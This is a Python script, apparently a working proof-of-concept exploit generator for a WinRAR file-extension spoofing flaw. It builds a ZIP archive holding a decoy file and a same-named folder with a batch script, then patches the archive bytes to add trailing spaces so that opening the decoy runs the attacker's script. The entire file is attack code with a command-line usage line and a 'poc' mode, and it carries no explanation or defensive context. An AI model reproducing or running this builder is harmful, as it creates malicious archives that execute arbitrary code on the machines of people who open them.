import shutil
import os
import sys


def exploit_winrar(exploit_name, script_name, output_path, tempdir='temp'):
    try:
        extension = os.path.splitext(exploit_name)[-1].encode()
        # Clear tempdir if it exists
        if os.path.exists(tempdir):
            shutil.rmtree(tempdir)
            print('[+] Removed existing temp dir')

        # Create tempdir
        os.mkdir(tempdir)
        print('[+] Created temp dir')

        # Create subdirectories and copy files
        file_path = os.path.join(tempdir, exploit_name + "s")

        os.mkdir(file_path)
        print('[+] Created subdirectories')

        shutil.copyfile(script_name, os.path.join(file_path, exploit_name + "s.bat"))
        shutil.copyfile(exploit_name, os.path.join(tempdir, exploit_name + "f"))
        print('[+] Copied files to temp dir')

        # Create a zip archive
        shutil.make_archive(tempdir, 'zip', tempdir)
        print('[+] Created zip archive')

        # Modify zip content
        with open(tempdir + ".zip", "rb") as zip_file:
            zip_content = zip_file.read()
            zip_content = zip_content.replace(extension + b"s", extension + b" ")
            zip_content = zip_content.replace(extension + b"f", extension + b" ")

        # Write modified zip content to output path
        with open(output_path, "wb") as output_file:
            output_file.write(zip_content)
            print('[+] Modified zip content written to output')

    finally:
        # Clean up temp files and directories
        if os.path.exists(tempdir):
            shutil.rmtree(tempdir)
            print('[+] Cleaned up temp dir')
        if os.path.exists(tempdir + ".zip"):
            os.remove(tempdir + ".zip")
            print('[+] Removed zip file')


def main():
    args = sys.argv
    file_name = args[0]
    if len(args) == 2 and args[1] == 'poc':
        exploit_winrar('test.txt', 'script.bat', 'exploit.zip')
        exit(1)
    elif len(args) != 4:
        print(f'Usage: python {file_name} <file_path> <script_path> <output_path>\n')
        sys.exit(1)
    file_path = args[1]
    script_path = args[2]
    output_path = args[3]
    exploit_winrar(file_path, script_path, output_path)


if __name__ == '__main__':
    main()
